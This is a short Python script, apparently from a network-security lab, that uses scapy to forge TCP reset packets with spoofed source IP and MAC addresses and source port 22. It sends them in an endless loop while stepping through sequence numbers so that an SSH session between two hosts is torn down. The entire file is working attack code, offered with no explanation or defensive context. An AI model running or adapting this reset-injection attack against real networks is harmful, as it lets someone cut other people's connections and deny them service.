import sys
import os
import random
from scapy.all import *



def main1(i):
	src_ip="192.168.56.102"
	dest_ip="192.168.56.103"
	src_mac="08:00:27:1A:C1:21"
	dest_mac="08:00:27:36:72:04"
	dest_port=int(sys.argv[1])
	seq_no=int(sys.argv[2])+i
	#ack_no=int(sys.argv[3])+i
	send_rst_packet(src_ip,dest_ip,src_mac,dest_mac,dest_port,seq_no)

	#send_rst_packet(dest_ip,src_ip,dest_mac,src_mac)





def send_rst_packet(src_ip,dest_ip,src_mac,dest_mac,dest_port,seq_no):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(src=src_ip,dst=dest_ip)
	
	
	tcp_h=TCP(flags="R",sport=22,dport=dest_port,seq=seq_no)
	pkt=eth_h/ip_h/tcp_h 
	sendp(pkt,iface="eth13") 
	print "sending packet with seq. no. "+ str(seq_no) +" and to port no. " +str(dest_port)

	
	


i=0
while i>=0:
	main1(i)
	i=i+1
